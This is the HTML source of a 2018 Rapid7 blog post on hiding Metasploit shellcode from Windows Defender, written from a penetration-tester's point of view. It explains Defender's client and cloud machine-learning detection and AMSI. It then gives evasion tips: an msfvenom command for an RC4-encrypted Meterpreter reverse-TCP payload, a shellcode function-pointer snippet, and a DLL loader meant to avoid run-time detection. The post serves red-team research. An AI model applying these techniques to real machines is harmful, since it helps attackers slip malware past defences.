@@ -1,0 +1,506 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr" >
+<head>
+    <meta http-equiv="content-type" content="text/html; charset=utf-8" charset="utf-8">
+    <meta http-equiv="x-ua-compatible" content="ie=edge">
+    <meta name="HandheldFriendly" content="True" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+    <title>Hiding Metasploit Shellcode to Evade Windows Defender</title>
+    <meta name="robots" content="index, follow">    
+
+    <link rel="stylesheet" type="text/css" href="/assets/css/style.css?v=a11ed6eaa3" />
+    <link rel="stylesheet" type="text/css" href="/assets/css/annimate.min.css?v=a11ed6eaa3" />
+    <link rel="stylesheet" type="text/css" href="/assets/css/prettycode-min.css?v=a11ed6eaa3" />
+    <script src="//js.maxmind.com/js/apis/geoip2/v2.1/geoip2.js" type="text/javascript"></script>
+    <script src="https://rapid7.com/includes/js/populateCountryState.js"></script>
+
+    <meta name="primary_tag" content="metasploit" /> 
+
+    <script>
+      dataLayer = [];
+    </script>
+    <!-- Google Tag Manager -->
+        <script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+        new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+        j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+        'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+        })(window,document,'script','dataLayer','GTM-WBTPTVC');</script>
+    <!-- End Google Tag Manager -->
+
+
+    <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
+    <link rel="canonical" href="https://blog.rapid7.com/2018/05/03/hiding-metasploit-shellcode-to-evade-windows-defender/" />
+    <meta name="referrer" content="no-referrer-when-downgrade" />
+    <link rel="amphtml" href="https://blog.rapid7.com/2018/05/03/hiding-metasploit-shellcode-to-evade-windows-defender/amp/" />
+    
+    <meta property="og:site_name" content="Rapid7 Blog" />
+    <meta property="og:type" content="article" />
+    <meta property="og:title" content="Hiding Metasploit Shellcode to Evade Windows Defender" />
+    <meta property="og:description" content="Being on the offensive side in the security field, I personally have a lot of respect for the researchers and engineers in the antivirus industry, and the companies dedicated to investing so much in them. If malware development is a cat-and-mouse game, then I would say that the industry creates" />
+    <meta property="og:url" content="https://blog.rapid7.com/2018/05/03/hiding-metasploit-shellcode-to-evade-windows-defender/" />
+    <meta property="og:image" content="https://blog.rapid7.com/content/images/2018/05/meta-3-1.png" />
+    <meta property="article:published_time" content="2018-05-03T18:00:00.000Z" />
+    <meta property="article:modified_time" content="2018-05-16T13:07:07.000Z" />
+    <meta property="article:tag" content="Metasploit" />
+    <meta property="article:tag" content="Hacking" />
+    <meta property="article:tag" content="Antivirus" />
+    
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:title" content="Hiding Metasploit Shellcode to Evade Windows Defender" />
+    <meta name="twitter:description" content="Being on the offensive side in the security field, I personally have a lot of respect for the researchers and engineers in the antivirus industry, and the companies dedicated to investing so much in them. If malware development is a cat-and-mouse game, then I would say that the industry creates" />
+    <meta name="twitter:url" content="https://blog.rapid7.com/2018/05/03/hiding-metasploit-shellcode-to-evade-windows-defender/" />
+    <meta name="twitter:image" content="https://blog.rapid7.com/content/images/2018/05/meta-3-1.png" />
+    <meta name="twitter:label1" content="Written by" />
+    <meta name="twitter:data1" content="Wei Chen" />
+    <meta name="twitter:label2" content="Filed under" />
+    <meta name="twitter:data2" content="Metasploit, Hacking, Antivirus" />
+    <meta property="og:image:width" content="974" />
+    <meta property="og:image:height" content="568" />
+    
+    <script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "publisher": {
+        "@type": "Organization",
+        "name": "Rapid7 Blog",
+        "logo": {
+            "@type": "ImageObject",
+            "url": "https://blog.rapid7.com/favicon.ico",
+            "width": 60,
+            "height": 60
+        }
+    },
+    "author": {
+        "@type": "Person",
+        "name": "Wei Chen",
+        "image": {
+            "@type": "ImageObject",
+            "url": "//www.gravatar.com/avatar/b593c81663146c25980c468070860eb4?s=250&d=mm&r=x",
+            "width": 250,
+            "height": 250
+        },
+        "url": "https://blog.rapid7.com/author/wei-chen/",
+        "sameAs": []
+    },
+    "headline": "Hiding Metasploit Shellcode to Evade Windows Defender",
+    "url": "https://blog.rapid7.com/2018/05/03/hiding-metasploit-shellcode-to-evade-windows-defender/",
+    "datePublished": "2018-05-03T18:00:00.000Z",
+    "dateModified": "2018-05-16T13:07:07.000Z",
+    "image": {
+        "@type": "ImageObject",
+        "url": "https://blog.rapid7.com/content/images/2018/05/meta-3-1.png",
+        "width": 974,
+        "height": 568
+    },
+    "keywords": "Metasploit, Hacking, Antivirus",
+    "description": "Being on the offensive side in the security field, I personally have a lot of\nrespect for the researchers and engineers in the antivirus industry, and the\ncompanies dedicated to investing so much in them. If malware development is a\ncat-and-mouse game, then I would say that the industry creates some of the most\nterrifying hunters. Penetration testers and red teamers suffer the most from\nthis while using Metasploit [https://www.rapid7.com/products/metasploit/], which\nforced me to look into how to",
+    "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "https://blog.rapid7.com/"
+    }
+}
+    </script>
+
+    <meta name="generator" content="Ghost 3.1" />
+    <link rel="alternate" type="application/rss+xml" title="Rapid7 Blog" href="https://blog.rapid7.com/rss/" />
+</head>
+<body class="post-template tag-metasploit tag-hacking tag-antivirus">
+
+    <input name="pid" value="5aea029e5ee9190706825770" type="text" id="pid" style="position: absolute; left: -999999px" /> 
+
+    <!-- Google Tag Manager (noscript) -->
+    <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-WBTPTVC"
+    height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+    <!-- End Google Tag Manager (noscript) -->  
+
+    <div id="__"></div>
+
+    <div id="gdprAlert" class="overlay">
+        <div class="gdpr-modal">
+            <div>
+                <h2>Quick Cookie Notification</h2>
+                <p>This site uses cookies, including for analytics, personalization, and advertising purposes.  For more information or to change your cookie settings, <a href="https://www.rapid7.com/privacy-policy/tracking-technologies/" target="_blank">click here</a>.  <br /><br />If you continue to browse this site without changing your cookie settings, you agree to this use.</p>
+                <button class="button mdBtn blue" id="gdprClose">I AGREE, LET’S GO!</button>
+                <hr>
+                <p class="fineprint">View <a href="https://www.rapid7.com/privacy-policy/tracking-technologies/" target="_blank">Cookie Policy</a> for full details</p>
+            </div>
+
+        </div>
+    </div> 
+    <script>document.getElementById('gdprAlert').style.display = 'none';</script>
+
+    <!--[if lte IE 10]>
+    <div id="ie-conditional"><spa>Your IE browser is out of date - Upgrade to the latest version of IE or Chrome for an optimal website experience.</span> <a href="https://support.microsoft.com/en-us/help/17621/internet-explorer-downloads" title="Upgrade IE Now" class="button smBtn darkClear" target="_blank">Upgrade IE Now</a>
+    <button class="close-button" type="button" id="closeIEBar">
+        <img src="../includes/img/close_white.svg">
+    </button>
+    </div>
+    <![endif]-->
+
+    <div id="search-overlay">
+        <input type="text" placeholder="Search all the blog things..." class="typeahead" />
+        <img src="/assets/images/close-white.svg?v=a11ed6eaa3" width="20" height="20" class="close-modal" />
+    </div>
+
+    
+    
+
+<section>     
+    <header style="background-image: url(https://blog.rapid7.com/content/images/2018/05/meta-3-1.png);" class="animated fadeIn secondary-header">
+        <div id="top-nav">
+            <div class="row">
+                <div id="logo">
+                    <a class="logo-block" href="https://www.rapid7.com"><img src="https://www.rapid7.com/includes/img/Rapid7_logo.svg" alt="Rapdi7" width="148" /></a>
+                    <a class="logo-title" href="https://blog.rapid7.com" title="Rapid7 Blog">Blog</a>
+                </div>
+                <div class="subscribe-btn">
+                    <a class="button mdBtn darkClear">Subscribe</a>
+                </div>
+            </div>
+            <div class="row">
+                    <div class="utility-nav">
+        <ul class="category-drop-menu" id="header-nav">
+            <li><a href="https://blog.rapid7.com/tag/vulnerability-management/" title="Vulnerability Management" id="nav-item-vulnerability-management" class="nav-item">Vulnerability Management</a></li>
+            <li><a href="https://blog.rapid7.com/tag/detection-and-response/" title="Detection &amp; Response" id="nav-item-detection-response" class="nav-item">Detection &amp; Response</a></li>
+            <li><a href="https://blog.rapid7.com/tag/application-security/" title="Application Security" id="nav-item-application-security" class="nav-item">Application Security</a></li>
+            <li><a href="https://blog.rapid7.com/tag/research/" title="Research" id="nav-item-research" class="nav-item">Research</a></li>
+            <li><a href="https://blog.rapid7.com/tag/security-strategy/" title="Security Strategy" id="nav-item-security-strategy" class="nav-item">Security Strategy</a></li>
+            <li><a href="https://blog.rapid7.com/tag/metasploit/" title="Metasploit" id="nav-item-metasploit" class="nav-item">Metasploit</a></li>
+            <li><a href="https://blog.rapid7.com/tag/" title="More..." id="nav-item-more" class="nav-item">More...</a></li>
+            <li class="view-all"><a href="/tag/" id="nav-item-mobile-view-all" title="View All Tags">View All Tags</a></li>
+        </ul>
+    </div>
+
+            </div>
+        </div>
+        <div id="hero">
+            <div class="row expanded">
+                <div class="columns medium-10 medium-offset-1 large-8 large-offset-2">
+                    <h1>Hiding Metasploit Shellcode to Evade Windows Defender</h1>
+                </div>
+            </div>
+        </div>
+    </header>
+</section>
+
+<div class="byline-bar" id="byline-bar">
+    <div class="row">
+        <div class="columns medium-10 medium-offset-1 large-8 large-offset-2">
+            <div class="byline-row">
+                <a href="/author/wei-chen/" class="post-author">
+                    <div class="author-image-wrapper">
+                        <img src="//www.gravatar.com/avatar/b593c81663146c25980c468070860eb4?s&#x3D;250&amp;d&#x3D;mm&amp;r&#x3D;x" alt="Wei Chen" />
+                    </div>
+                    <span>Wei Chen</span>
+                </a>
+            </div>
+            <div class="middle-items">
+                <div class="content-items">
+                    <!-- set back to class="first" -->
+                    <span class="first">May 03, 2018</span>
+                    <span class="read-time">
+                        7 min read
+                    </span>
+                </div>
+            </div>
+            <div class="post-stats">
+                <h4>POST STATS: </h4>
+                <a href="#comments"><span class="comment-count disqus-comment-count scroll" data-disqus-url="https://blog.rapid7.com/2018/05/03/hiding-metasploit-shellcode-to-evade-windows-defender/" data-disqus-identifier="5aea029e5ee9190706825770"></span></a>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="content_main">
+    <div class="row">
+        <div class="columns large-1 large-offset-1 left">
+            <div data-sticky-container>
+                <div class="share-bar-vertical show-for-large" data-sticky data-top-anchor="post-single:top" data-btm-anchor="related-posts:top" data-margin-top="3" data-margin-bottom="5" >
+                    <div id="share-bar" class="animated flipInY">
+                        <h4>SHARE</h4>
+                        <div class="share-icon li"><a href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://blog.rapid7.com/2018/05/03/hiding-metasploit-shellcode-to-evade-windows-defender/&amp;title=Hiding Metasploit Shellcode to Evade Windows Defender&amp;summary=Being on the offensive side in the security field, I personally have a lot of respect for the researchers and engineers in the antivirus" onclick="window.open(this.href, 'linkedin-share', 'width=520,height=570');return false;"><img src="/assets/images/linkedin.svg?v=a11ed6eaa3" width="20" height="20" /></a></div>
+                        <div class="share-icon tw"><a href="https://twitter.com/intent/tweet?text=Hiding Metasploit Shellcode to Evade Windows Defender&amp;url=https://blog.rapid7.com/2018/05/03/hiding-metasploit-shellcode-to-evade-windows-defender/"
+                onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;"><img src="/assets/images/twitter.svg?v=a11ed6eaa3" width="20" height="20" /></a></div>
+                        <div class="share-icon fb"><a href="https://www.facebook.com/sharer/sharer.php?u=https://blog.rapid7.com/2018/05/03/hiding-metasploit-shellcode-to-evade-windows-defender/"
+                onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;"><img src="/assets/images/facebook.svg?v=a11ed6eaa3" width="20" height="20" /></a></div>
+                       <!--  <div class="share-icon rd"><a href="http://reddit.com/submit?url=https://blog.rapid7.com/2018/05/03/hiding-metasploit-shellcode-to-evade-windows-defender/&amp;title=Hiding Metasploit Shellcode to Evade Windows Defender" onclick="window.open(this.href, 'reddit-share','width=580,height=496');return false;"><img src="/assets/images/reddit.svg?v=a11ed6eaa3" width="20" height="20" /></a></div> -->
+                    </div>
+                    &nbsp;
+                </div>
+            </div>
+        </div>
+        <div class="columns medium-10 medium-offset-1 large-8 large-offset-0 end post-single right" id="post-single">   
+            <div class="post-content">
+                <!--kg-card-begin: markdown--><p>Being on the offensive side in the security field, I personally have a lot of respect for the researchers and engineers in the antivirus industry, and the companies dedicated to investing so much in them. If malware development is a cat-and-mouse game, then I would say that the industry creates some of the most terrifying hunters. Penetration testers and red teamers suffer the most from this while using <a href="https://www.rapid7.com/products/metasploit/">Metasploit</a>, which forced me to look into how to improve our payload evasion—and really, it’s hard.</p>
+<p>I had two important requirements for this experiment:</p>
+<ul>
+<li>Find a solution to reuse existing Metasploit shellcodes.</li>
+<li>The unmodified shellcode should not be detectable by popular antivirus.</li>
+</ul>
+<p>One of the challenges with Metasploit shellcode is that they are small, because size matters for various tactical reasons. This also makes shellcode difficult to improve, and eventually, all the AV classifiers have the word “EVIL” written all over the place. You don’t stand a chance.</p>
+<p>Most modern antivirus engines are powered by machine learning, and this has been a huge game changer for AV evasion. Not only are AV engines much smarter at detecting potential threats, they also respond much quicker. As soon as your code behavior is something too malicious-looking, which can be as simple as using the wrong Windows API (such as <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms681674(v=vs.85).aspx">WriteProcessMemory</a> or even a <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa366887(v=vs.85).aspx">VirtualAlloc</a>, one of the AI checks will get you. The malware researchers also get a copy of your code, which means you will burn all of your hard work within minutes.</p>
+<p>The best way to describe what a machine learning-based antivirus looks like is that there are two components to the design: a client ML and the cloud ML.</p>
+<h2 id="clientml">Client ML</h2>
+<p>The client ML is something we, as users, actually interact with. The vast majority of scanned objects are evaluated by the lightweight machine learning models built into the Windows Defender client, which runs locally on the operating system.</p>
+<p>Classifications such as traditional signatures, generic, behavior detection, heuristics, and so on pick up 97% of malware on the client <a href="https://cloudblogs.microsoft.com/microsoftsecure/2017/05/08/antivirus-evolved/">according to Microsoft</a>. Using these classifiers, the client also collects “features” of the program, meaning measurable data or characteristics of the scanned object.</p>
+<p>The client machine can operate independently, but without the cloud, Windows Defender works best at detecting known threats, and not the unknown ones. This means that if you are having trouble connecting to the internet, you are much more vulnerable from an internal attack.</p>
+<h2 id="cloudml">Cloud ML</h2>
+<p>The cloud ML is kind of the mysterious one, because we don’t have access to the code and the training data, except for some blog posts published on Microsoft’s website and a hint at the use of the <a href="https://github.com/Microsoft/LightGBM">LightGBM</a> framework.</p>
+<p>The LightGBM framework is based on the <a href="https://en.wikipedia.org/wiki/Decision_tree">Decision Tree model</a>. Although popular, ask any machine learning scientists and they will tell you this is really basic. College graduates with Computer Science degrees should be able to tell you a thing or two about it, too.</p>
+<p>In machine learning, the hottest subject has been the <a href="https://en.wikipedia.org/wiki/Deep_learning">Deep Learning model</a>. While Microsoft does have a deep learning toolkit called <a href="https://github.com/Microsoft/CNTK">CNTK</a>, there isn’t so much information about how Windows Defender’s cloud ML might be using it, so this is not something we will discuss further.</p>
+<p>What we do know is that when the client ML cannot reach a definitive verdict, it will use the cloud service for deeper analysis. And when this process is involved, it becomes a nightmare for the malware.</p>
+<p>The first round of the analysis is the metadata-based ML models. On your operating system, this would be the cloud-delivered protection option, and you can notice it in action due to the extra delay when you execute a file on Windows. Quite often, it is not a problem for me to evade the client ML’s static and real-time protection, but I start to fail when cloud-delivered protection is turned on.</p>
+<p>To take full advantage of the cloud service, there is another option called Automatic Sample Submission that basically sends your suspicious-looking program to Microsoft, and runs by additional detections such as sample analysis-based and detonation-based ML models.</p>
+<p>If the cloud decides your program is bad, then it will be labeled as one of these generic AI checks: Fuerboos, Fury, Cloxer, or Azden. And then your attack will never work again.</p>
+<h2 id="antimalwarescaninterface">Antimalware Scan Interface</h2>
+<p><a href="https://msdn.microsoft.com/en-us/library/windows/desktop/dn889587(v=vs.85).aspx">Antimalware Scan Interface (AMSI)</a> is a programming interface created by Microsoft that allows any Windows applications to take advantage of Windows Defender’s engine and scan for malicious inputs, which makes AV evasion even more difficult. An example of such an application is Powershell, which brings us an opportunity to talk about why Powershell isn’t necessarily your best friend when it comes to AV evasion.</p>
+<p>Powershell has been a huge playground for attackers, because antivirus doesn’t do a great job at checking it compared to a traditional executable. You can also pass a line of Powershell code as an argument for Powershell.exe, which creates stealth because technically we are not touching the disk. For example:</p>
+<pre><code>powershell.exe -command &quot;Write-Output [Convert]::FromBase64String('SGVsbG8gV29ybGQh')&quot;
+</code></pre>
+<p>This is kind of where Powershell sells you out. Under the hood, Powershell actually calls the <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/dn889865(v=vs.85).aspx">AmsiScanBuffer function</a> to ask Windows Defender whether the user-supplied code is malicious or not:</p>
+<p><img src="https://blog.rapid7.com/content/images/2018/05/meta-3.png" alt=""></p>
+<p>Powershell is so heavily abused, it is starting to look predictable. If you are an IT admin, and you see some Base64 string being passed to Powershell.exe, it is probably up to no good. As attackers, we should recognize that Powershell is no longer everyone’s top favorite payload technique. The AMSI offers any Windows applications the ability to benefit from Windows Defender’s capabilities, which is making scripting languages harder to abuse.</p>
+<p>Despite all the technologies Windows Defender is equipped with, it is not without some blind spots. To ensure the survival of our payloads, I discovered some tips that I would like to share:</p>
+<h2 id="shellcodesurvivaltip1encryption">Shellcode Survival Tip 1: Encryption</h2>
+<p>If you are familiar with the <a href="https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers">Metasploit Framework</a>, you would know that there is a module type called encoders. The purpose of an encoder is really to get around bad characters in exploits. For example, if you are exploiting a buffer overflow, chances are your long string (including the payload) cannot have a null character in it. We can use an encoder to change that null byte, and then change it back at run-time.</p>
+<p>I’m pretty sure at one point of your life, you’ve tried to use an encoder to bypass AV. Although this might work sometimes, encoders aren’t meant for AV evasion at all. You should use encryption.</p>
+<p>Encryption is one of those things that will defeat antivirus’ static scanning effectively, because the AV engine can’t crack it immediately. Currently, there are a few encryption/encoding types msfvenom supports to protect your shellcode: AES256-CBC, RC4, XOR, and Base64.</p>
+<p>To generate an encrypted shellcode with msfvenom, here is an example with Metasploit 5:</p>
+<pre><code>ruby ./msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 --encrypt rc4 --encrypt-key thisisakey -f c
+</code></pre>
+<p>The above generates a windows/meterpreter/reverse_tcp that is encrypted with RC4. It is also generated in C format, so that you can build your own loader in C/C++.</p>
+<p>Although antivirus isn’t good at scanning encrypted shellcode statically, run-time monitoring is still a strong line of defense. It is easy to get caught after you decrypt and execute it.</p>
+<h2 id="shellcodesurvivaltip2separation">Shellcode Survival Tip 2: Separation</h2>
+<p>Run-time detection is really difficult to fool, because at the end of the day, you have to execute the code. Once you do that, antivirus logs your every move and then finally determines you are malware. This, however, seems to be less of a problem if you can separate the loader from the actual payload in different process spaces.</p>
+<p>This is a behavior I noticed while trying to execute my decrypted payload. First I was able to decrypt my shellcode perfectly fine, with my evil shellcode still in memory, but as soon as I tried to execute it from a function pointer like this, AV would catch me:</p>
+<pre><code>int (*func)();
+func = (int (*)()) shellcode;
+(int)(*func)();
+</code></pre>
+<p>However, if I removed the last line, then AV was fine with the program:</p>
+<pre><code>(int)(*func)();
+</code></pre>
+<p>This seems to imply that it’s usually okay to have harmful code in memory as long as you don’t execute it. Run-time analysis probably relies a lot on what code is actually executed; it cares less about what the program could potentially do. This makes sense, of course. If it does, the performance penalty is too high.</p>
+<p>So instead of using a function pointer, I did a LoadLibrary to solve the problem with the loader:</p>
+<pre><code>#include &lt;iostream&gt;
+#include &lt;Windows.h&gt;
+
+int main(void) {
+  HMODULE hMod = LoadLibrary(&quot;shellcode.dll&quot;);
+  if (hMod == nullptr) {
+    cout &lt;&lt; &quot;Failed to load shellcode.dll&quot; &lt;&lt; endl;
+  }
+
+  return 0;
+}
+</code></pre>
+<h2 id="themouselivesanotherdayfornow">The Mouse Lives Another Day…For Now</h2>
+<p>AV evasion is actually a difficult game. Despite the fact I was able to find a solution that can work around the detections, it should be no concern that they will catch whatever cool tricks you have, and terminate your attack quickly thanks to the cutting edge technologies and the talented people behind it.</p>
+<p>It’s a lot like surviving a cat-and-mouse game. And today, the mouse lives. Using things like encryption and custom loader, you can still create something that is difficult enough for the AV engine to understand and lets you successfully gain access on the target machine.</p>
+<p>The following is a demonstration that combines all the techniques described above:</p>
+<iframe width="560" height="315" src="https://www.youtube.com/embed/dRkQiANI138" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
+<h2 id="metasploitisfree">Metasploit Is Free!</h2>
+<p>By the way, did I mention Metasploit Framework is actually free? Download it <a href="https://metasploit.com/">here</a>.</p>
+<p>If you are curious on where to get a sneak peak of Metasploit 5, it is currently under development. The best source is <a href="https://github.com/rapid7/metasploit-framework">Metasploit’s Github repository</a>: watch the pull requests with the <code>msf5</code> label. We accept pull requests, too!</p>
+<!--kg-card-end: markdown-->
+            </div>
+        </div>
+    </div>
+
+
+    <div id="post-bottom-info-wrapper">
+        <div class="row">
+            <div class="columns medium-10 medium-offset-1 large-8 large-offset-2"> 
+                <div class="post-bottom-info" id="post-bottom-info">
+                    <div class="row expanded">
+                        <div class="columns medium-6">
+                            <h4>POST STATS</h4>
+                            <div class="wrapper-item"><a href="#comments" class="scroll"><span class="comment-count disqus-comment-count" data-disqus-url="https://blog.rapid7.com/2018/05/03/hiding-metasploit-shellcode-to-evade-windows-defender/" data-disqus-identifier="5aea029e5ee9190706825770"></span></a></div>
+                            <h4>POST TAGS</h4>
+                            <div class="tag-row wrapper-item">
+                                <ul>
+                                        <li><a href="/tag/metasploit/" title="Metasploit">Metasploit</a></li>
+                                        <li><a href="/tag/hacking/" title="Hacking">Hacking</a></li>
+                                        <li><a href="/tag/antivirus/" title="Antivirus">Antivirus</a></li>
+                                </ul>
+                            </div>
+                            <h4>SHARING IS CARING</h4>
+                             <div class="share-icon li"><a href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://blog.rapid7.com/2018/05/03/hiding-metasploit-shellcode-to-evade-windows-defender/&amp;title=Hiding Metasploit Shellcode to Evade Windows Defender&amp;summary=Being on the offensive side in the security field, I personally have a lot of respect for the researchers and engineers in the antivirus" onclick="window.open(this.href, 'linkedin-share', 'width=520,height=570');return false;"><img src="/assets/images/linkedin.svg?v=a11ed6eaa3" width="20" height="20" /></a></div>
+                            <div class="share-icon tw"><a href="https://twitter.com/intent/tweet?text=Hiding Metasploit Shellcode to Evade Windows Defender&amp;url=https://blog.rapid7.com/2018/05/03/hiding-metasploit-shellcode-to-evade-windows-defender/"
+                    onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;"><img src="/assets/images/twitter.svg?v=a11ed6eaa3" width="20" height="20" /></a></div>
+                            <div class="share-icon fb"><a href="https://www.facebook.com/sharer/sharer.php?u=https://blog.rapid7.com/2018/05/03/hiding-metasploit-shellcode-to-evade-windows-defender/"
+                    onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;"><img src="/assets/images/facebook.svg?v=a11ed6eaa3" width="20" height="20" /></a></div>
+                            <!-- <div class="share-icon rd"><a href="http://reddit.com/submit?url=https://blog.rapid7.com/2018/05/03/hiding-metasploit-shellcode-to-evade-windows-defender/&amp;title=Hiding Metasploit Shellcode to Evade Windows Defender" onclick="window.open(this.href, 'reddit-share','width=580,height=496');return false;"><img src="/assets/images/reddit.svg?v=a11ed6eaa3" width="20" height="20" /></a></div> -->
+                        </div>
+                        <div class="columns medium-6 end">
+                            <div class="author-box">
+                                <a href="/author/wei-chen/" class="post-author">
+                                    <div class="author-image-wrapper">
+                                        <img src="//www.gravatar.com/avatar/b593c81663146c25980c468070860eb4?s&#x3D;250&amp;d&#x3D;mm&amp;r&#x3D;x" alt="Wei Chen" />
+                                    </div>
+                                </a>
+                                <div class="content">
+                                    <h5>AUTHOR</h5>
+                                    <a href="/author/wei-chen/" title="Wei Chen"><h4>Wei Chen</h4></a>
+                                    <p>Wei is a Rapid7 veteran and an all-time top committer for the Metasploit Framework. Now a lead offensive security researcher for Metasploit, he specializes in vuln analysis and exploit development.</p>
+                                    <a href="/author/wei-chen/" class="button smBtn clear">View Wei Chen’s Posts</a>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="comments">
+        <div class="row">
+            <div class="columns medium-10 medium-offset-1 large-8 large-offset-2">
+                <div id="disqus_thread"></div>
+                <script>
+
+                /**
+                *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+                *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
+                
+                var disqus_config = function () {
+                this.page.url = 'https://blog.rapid7.com/2018/05/03/hiding-metasploit-shellcode-to-evade-windows-defender/';  // Replace PAGE_URL with your page's canonical URL variable
+                this.page.identifier = '5aea029e5ee9190706825770'; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+                };
+                
+                (function() { // DON'T EDIT BELOW THIS LINE
+                var d = document, s = d.createElement('script');
+                s.src = 'https://rapid7.disqus.com/embed.js';
+                s.setAttribute('data-timestamp', +new Date());
+                (d.head || d.body).appendChild(s);
+                })();
+                </script>
+                <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+            </div>
+        </div>
+    </div>
+
+
+
+</div>
+
+
+
+
+
+   <!--  <div id="bottom-content-row" data-equalizer="bottom-content-item-top" data-equalize-on="medium">
+        <div class="row expanded">
+            <div class="columns medium-10 medium-offset-1">
+                <div data-equalizer="bottom-content-item-bottom" data-equalize-on="medium">
+                    <div class="row expanded">
+
+                        <div class="columns medium-4 post-card" id="blog-bottom-content-1">
+                            <div class="post-top" data-equalizer-watch="bottom-content-item-top">
+                                <a href="https://www.rapid7.com/info/national-exposure-index" target="_blank" title="National Exposure Index 2018"><div class="card-img" data-bg="https://www.rapid7.com/globalassets/_images/blog-post-images/nei-hero-2018.jpg"></div></a>
+                            </div>
+                            <div class="post-bottom">
+                                <div class="card-content" data-equalizer-watch="bottom-content-item-bottom">
+                                    <h3>Featured Research</h3>
+                                    <h2><a href="https://www.rapid7.com/info/national-exposure-index" target="_blank" title="National Exposure Index 2018">National Exposure Index 2018</a></h2>
+                                    <p>The National Exposure Index is an exploration of data derived from Project Sonar, Rapid7's security research project that gains insights into global exposure to common vulnerabilities through internet-wide surveys.</p>
+                                    <a href="https://www.rapid7.com/info/national-exposure-index" target="_blank" class="button mdBtn clear">Learn More</a>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="columns medium-4 post-card" id="blog-bottom-content-2">
+                            <div class="post-top" data-equalizer-watch="bottom-content-item-top">
+                                <a href="https://information.rapid7.com/gartner-make-your-siem-successful.html " title="Make Your SIEM Project a Success with Rapid7" target="_blank"><div class="card-img" data-bg="https://www.rapid7.com/globalassets/_images/blog-post-images/siem-banner.jpg"></div></a>
+                            </div>
+                            <div class="post-bottom">
+                                <div class="card-content" data-equalizer-watch="bottom-content-item-bottom">
+                                    <h3>Toolkit</h3>
+                                    <h2><a href="https://information.rapid7.com/gartner-make-your-siem-successful.html " target="_blank" title="Make Your SIEM Project a Success with Rapid7">Make Your SIEM Project a Success with Rapid7</a></h2>
+                                    <p>In this toolkit, get access to Gartner's report “Overcoming Common Causes for SIEM Solution Deployment Failures,” which details why organizations are struggling to unify their data and find answers from it. Also get the Rapid7 companion guide with helpful recommendations on approaching your SIEM needs.</p>
+                                    <a href="https://information.rapid7.com/gartner-make-your-siem-successful.html " target="_blank" class="button mdBtn clear">Download Now</a>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="columns medium-4 post-card" id="blog-bottom-content-3">
+                            <div class="post-top" data-equalizer-watch="bottom-content-item-top">
+                                <a href="https://www.rapid7.com/info/threat-report/" target="_blank" title="Quarterly Threat Report"><div class="card-img" data-bg="https://www.rapid7.com/contentassets/fb04de9d54f64410ab183de609b390b8/long-heromd-for-web.jpg"></div></a>
+                            </div>
+                            <div class="post-bottom">
+                                <div class="card-content" data-equalizer-watch="bottom-content-item-bottom">
+                                    <h3>Featured Research</h3>
+                                    <h2><a href="https://www.rapid7.com/info/threat-report/" target="_blank" title="Quarterly Threat Report">Quarterly Threat Report</a></h2>
+                                    <p>Rapid7’s Quarterly Threat Report leverages intelligence from our extensive network—including the Insight platform, managed detection and response engagements, Project Sonar, Heisenberg Cloud, and the Metasploit community—to put today’s shifting threat landscape into perspective. It gives you a clear picture of the threats that you face within your unique industry, and how those threats change throughout the year.</p>
+                                    <a href="https://www.rapid7.com/info/threat-report/" target="_blank" class="button mdBtn clear">Learn More</a>
+                                </div>
+                            </div>
+                        </div>
+
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div> -->
+
+   <div id="subscribe">
+    <div class="push-down">
+        <h3>Never miss a blog</h3>
+        <h4>Get the latest stories, expertise, and news about security today.</h4>
+        <script src="//app-sj20.marketo.com/js/forms2/js/forms2.min.js"></script>
+          <form id="mktoForm_4144"></form>
+          <div id="thankyou" style="display: none;">You’re almost done! <br> Check your email to confirm your subscription.</div> 
+          <script>MktoForms2.loadForm("//app-sj20.marketo.com", "411-NAK-970", 4144, function(form) {
+             form.onSuccess(function(values, followUpUrl) {
+                window.dataLayer.push({ 'event': 'form_submit_success' });
+                form.getFormElem().hide();
+                document.getElementById("thankyou").style.display = "block";
+                return false;
+             });
+          });</script>
+        <img src="/assets/images/close-white.svg?v=a11ed6eaa3" width="20" height="20" class="close-modal-subscribe" />
+    </div>
+</div>
+<div class="subscribe-overlay"></div>
+    <div class="row expanded footer-top">
+        <div class="columns medium-10 medium-offset-1">
+            <div class="backToTop scroll">
+                <a href="#__" class="smooth">
